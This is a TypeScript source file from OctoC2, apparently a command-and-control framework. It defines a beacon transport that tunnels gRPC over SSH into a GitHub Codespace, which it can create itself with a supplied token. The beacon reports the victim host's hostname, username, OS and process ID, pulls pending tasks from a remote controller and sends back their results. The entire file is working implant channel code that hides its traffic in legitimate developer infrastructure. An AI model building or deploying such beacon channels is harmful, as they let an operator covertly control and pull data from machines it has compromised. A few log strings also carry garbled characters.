/**
 * OctoC2 — GrpcSshTentacle  (Tentacle 4 — Codespaces gRPC-over-SSH)
 *
 * Opens a GitHub-supported Codespaces port forward, then forwards a local port
 * to the gRPC server running inside the Codespace, then exchanges tasks and
 * results via @grpc/grpc-js.
 *
 * Environment variables:
 *   SVC_GRPC_CODESPACE_NAME      — Codespace name (e.g. org-repo-abc123)
 *   SVC_GRPC_PORT                — gRPC port inside Codespace (default: 50051)
 *   SVC_GRPC_LOCAL_PORT          — Local port for SSH tunnel (default: 50051)
 *   SVC_GRPC_DIRECT              — Skip SSH; connect gRPC directly to this address
 *   SVC_CODESPACES_GITHUB_TOKEN  — Explicit user credential for the Codespaces
 *                                  control plane; never an App lease
 *   SVC_GITHUB_CLI               — Optional path to the GitHub CLI executable
 *   SVC_AUTO_PROVISION_CODESPACE — Set to "true" to auto-create/start a Codespace
 *                                  when SVC_GRPC_CODESPACE_NAME is not set.
 *   SVC_CODESPACE_WAIT_MS        — Max ms to wait for Codespace Available (default 120 000)
 *
 * When GRPC_DIRECT is set, SshTunnel is never created — used for unit tests.
 */

import type {
  BeaconConfig,
  CheckinPayload,
  ITentacle,
  Task,
  TaskResult,
  ResultSubmissionOutcome,
} from "../types.ts";
import { createLogger }          from "../logger.ts";
import { SshTunnel }             from "./grpc/SshTunnel.ts";
import { BeaconGrpcClient }      from "./grpc/BeaconGrpcClient.ts";
import { CodespaceProvisioner }  from "./grpc/CodespaceProvisioner.ts";
import { readFile }              from "node:fs/promises";
import { canonicalJson }         from "@octoc2/shared";

const log = createLogger("GrpcSshTentacle");

export class GrpcSshTentacle implements ITentacle {
  readonly kind = "codespaces" as const;

  private readonly config: BeaconConfig;
  private tunnel:    SshTunnel | null        = null;
  private client:    BeaconGrpcClient | null = null;
  private connected  = false;

  // Heartbeat prefix tracking
  private readonly epoch = Math.floor(Date.now() / 1000);
  private seq = 0;
  private tag(): string { return `[job:${this.epoch}:grpc:${++this.seq}]`; }

  constructor(config: BeaconConfig) {
    this.config = config;
  }

  // ── isAvailable ──────────────────────────────────────────────────────────────

  async isAvailable(): Promise<boolean> {
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const direct = process.env.SVC_GRPC_DIRECT;
    if (direct && (
      !this.config.controllerToken ||
      !process.env["SVC_GRPC_CA_CERT"] ||
      !process.env["SVC_GRPC_CLIENT_KEY"] ||
      !process.env["SVC_GRPC_CLIENT_CERT"]
    )) {
      log.debug("isAvailable() â†’ false (gRPC mTLS/application credentials missing)");
      return false;
    }
    if (direct) {
      try {
        await this.ensureConnected();
        return true;
      } catch (err) {
        log.debug(`isAvailable() â†’ false: ${(err as Error).message}`);
        return false;
      }
    }

    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const codespace = process.env.SVC_GRPC_CODESPACE_NAME;
    const autoProvision = Boolean(
      process.env["SVC_AUTO_PROVISION_CODESPACE"] === "true" ||
      process.env["SVC_AUTO_PROVISION_CODESPACE"] === "1"
    );
    if (!process.env["SVC_CODESPACES_GITHUB_TOKEN"]?.trim()) {
      log.debug(
        "isAvailable() → false (SVC_CODESPACES_GITHUB_TOKEN is required for SSH mode)",
      );
      return false;
    }

    if (!codespace) {
      if (!autoProvision) {
        log.debug("isAvailable() → false (codespace name not set; auto-provision disabled)");
        return false;
      }
      // Auto-provision path — provisioning happens inside ensureConnected()
      log.info("[bootstrap] no Codespace configured — auto-provision enabled, will provision on connect");
    }

    try {
      // Use a generous timeout since provisioning a new Codespace can take 2+ minutes
      const timeoutMs = parseInt(
        process.env["SVC_CODESPACE_CONNECT_MS"] ?? "360000",
        10,
      );

      await Promise.race([
        this.ensureConnected(),
        new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error("connection timeout")), timeoutMs)
        ),
      ]);
      return true;
    } catch (err) {
      log.debug(`isAvailable() → false: ${(err as Error).message}`);
      return false;
    }
  }

  // ── checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    await this.ensureConnected();

    const resp = await this.client!.checkin({
      beaconId:  payload.beaconId,
      publicKey: payload.publicKey,
      hostname:  payload.hostname,
      username:  payload.username,
      os:        payload.os,
      arch:      payload.arch,
      pid:       payload.pid,
      checkinAt: payload.checkinAt,
      identityEnvelope: payload.identity
        ? JSON.stringify(payload.identity)
        : "",
    });

    const tasks: Task[] = (resp.pendingTasks ?? []).map((t) => ({
      taskId:   t.id,
      kind:     t.kind as Task["kind"],
      args:     (() => { try { return JSON.parse(t.argsJson ?? "{}") as Record<string, unknown>; } catch { return {}; } })(),
      issuedAt: t.issuedAt || undefined,
    }));

    log.info(`${this.tag()} checkin → ${tasks.length} task(s)`);
    return tasks;
  }

  // ── submitResult ─────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
    await this.ensureConnected();

    const response = await this.client!.submitResult({
      result: {
        taskId:      result.taskId,
        beaconId:    result.beaconId,
        success:     result.success,
        output:      result.output,
        data:        result.data        ?? "",
        completedAt: result.completedAt,
        signature:   result.signature   ?? "",
        metadataJson: result.metadata === undefined
          ? ""
          : canonicalJson(result.metadata),
        hasData: result.data !== undefined,
      },
    });
    if (!response.accepted) {
      const reason = response.message.trim() || "server did not accept result";
      log.warn(`gRPC submitResult rejected task ${result.taskId}: ${reason}`);
      return {
        artifactWritten: false,
        controllerAccepted: false,
        channel: "codespaces",
        acceptance: null,
      };
    }

    log.info(`${this.tag()} result submitted task ${result.taskId}`);
    return {
      artifactWritten: true,
      controllerAccepted: true,
      channel: "codespaces",
      acceptance: "direct-response",
    };
  }

  // ── teardown ─────────────────────────────────────────────────────────────────

  async teardown(): Promise<void> {
    this.connected = false;
    try { this.client?.close(); }         catch {}
    try { await this.tunnel?.close(); }   catch {}
    this.client = null;
    this.tunnel = null;
    log.debug("teardown() complete");
  }

  // ── ensureConnected (private) ─────────────────────────────────────────────────

  private async ensureConnected(): Promise<void> {
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    const direct = process.env.SVC_GRPC_DIRECT;

    // ── Direct mode (no SSH) — for pre-forwarded local addresses only ────────
    //
    // WARNING: Do NOT point SVC_GRPC_DIRECT at a Dev Tunnels URL
    // (*.app.github.dev). Dev Tunnels proxies external HTTP/2 to the backend
    // as HTTP/1.1. gRPC requires end-to-end H2C — the proxy breaks it with a
    // 502. Use the SSH tunnel path instead (SVC_GRPC_CODESPACE_NAME), or use
    // HttpTentacle (SVC_HTTP_URL) as the fallback channel via port 8080.
    if (direct) {
      const isDevTunnels = /\.app\.github\.dev(:\d+)?$/.test(direct);
      if (isDevTunnels) {
        log.warn(
          `[grpc] SVC_GRPC_DIRECT points to a Dev Tunnels URL (${direct}). ` +
          `Dev Tunnels downgrades H2→H1 for backend connections — gRPC will fail with 502. ` +
          `Use SSH tunnel mode (SVC_GRPC_CODESPACE_NAME) or HttpTentacle (SVC_HTTP_URL) instead.`
        );
      }
      if (!this.connected || !this.client) {
        this.client    = await this.createClient();
        await this.client.connect(direct);
        this.connected = true;
        log.debug(`Connected (direct) → ${direct}`);
      }
      return;
    }

    // ── SSH tunnel mode ───────────────────────────────────────────────────────
    if (this.connected && this.tunnel?.isAlive()) return;

    // ── Auto-provision Codespace if not configured ────────────────────────────
    // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
    if (!process.env.SVC_GRPC_CODESPACE_NAME) {
      const autoProvision = Boolean(
        process.env["SVC_AUTO_PROVISION_CODESPACE"] === "true" ||
        process.env["SVC_AUTO_PROVISION_CODESPACE"] === "1"
      );
      if (!autoProvision) {
        throw new Error("Codespace name not set and auto-provision is disabled");
      }

      const provisioner = new CodespaceProvisioner(
        this.codespacesGitHubToken(),
        this.config.repo.owner,
        this.config.repo.name,
      );
      const { name } = await provisioner.ensureRunning();

      // Inject into process.env so all subsequent tunnel attempts use the provisioned Codespace.
      // Bracket notation for writes — you cannot assign to a replaced literal.
      process.env["SVC_GRPC_CODESPACE_NAME"] = name;
    }

    const codespace = (process.env.SVC_GRPC_CODESPACE_NAME ?? process.env["SVC_GRPC_CODESPACE_NAME"])!;
    const grpcPort  = parseInt(process.env["SVC_GRPC_PORT"]       ?? "50051", 10);
    const localPort = parseInt(process.env["SVC_GRPC_LOCAL_PORT"] ?? "50051", 10);

    let lastErr: Error | null = null;

    for (let attempt = 0; attempt < 2; attempt++) {
      if (attempt > 0) {
        await new Promise((r) => setTimeout(r, 2000));
      }
      try {
        try { this.client?.close(); }      catch {}
        try { await this.tunnel?.close(); } catch {}

        this.tunnel = new SshTunnel();
        this.client = await this.createClient();

        await this.tunnel.connect(codespace, this.codespacesGitHubToken());
        log.info(`${this.tag()} Codespaces connection established → ${codespace}`);

        await this.tunnel.forward(localPort, grpcPort);
        await this.client.connect(`localhost:${localPort}`);

        this.connected = true;
        log.info(`${this.tag()} Codespaces tunnel established → ${codespace}:${grpcPort}`);
        return;
      } catch (err) {
        lastErr = err as Error;
        log.warn(`${this.tag()} connection attempt ${attempt + 1}/2 failed: ${lastErr.message}`);
      }
    }

    throw lastErr ?? new Error("Failed to establish gRPC-over-SSH connection");
  }

  private async createClient(): Promise<BeaconGrpcClient> {
    if (!this.config.controllerToken) {
      throw new Error("SVC_BEACON_API_TOKEN is required for gRPC");
    }
    const caPath = process.env["SVC_GRPC_CA_CERT"]?.trim();
    const keyPath = process.env["SVC_GRPC_CLIENT_KEY"]?.trim();
    const certPath = process.env["SVC_GRPC_CLIENT_CERT"]?.trim();
    if (!caPath || !keyPath || !certPath) {
      throw new Error(
        "SVC_GRPC_CA_CERT, SVC_GRPC_CLIENT_KEY, and SVC_GRPC_CLIENT_CERT are required",
      );
    }
    return new BeaconGrpcClient(this.config.controllerToken, {
      rootCerts: await readFile(caPath),
      privateKey: await readFile(keyPath),
      certChain: await readFile(certPath),
    });
  }

  private codespacesGitHubToken(): string {
    const token = process.env["SVC_CODESPACES_GITHUB_TOKEN"]?.trim();
    if (!token) {
      throw new Error(
        "SVC_CODESPACES_GITHUB_TOKEN is required for Codespaces API and SSH",
      );
    }
    return token;
  }
}
